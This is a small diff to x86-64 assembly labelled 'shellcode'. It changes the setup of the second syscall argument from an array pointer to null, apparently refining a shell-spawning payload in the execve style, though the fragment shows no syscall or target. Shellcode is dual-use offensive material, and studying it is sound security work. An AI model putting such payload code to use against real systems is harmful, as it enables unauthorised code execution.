@@ -11,9 +11,7 @@ shellcode:
     xor     %rdi, %rdi
     pop     %rdi            # string into first param
 
-    xor     %rsi, %rsi
-    add     %rdi, %rsi      # array for second param
-
+    xor     %rsi, %rsi      # null for second param
     xor     %rdx, %rdx      # null for third param
 
     xor     %rax, %rax
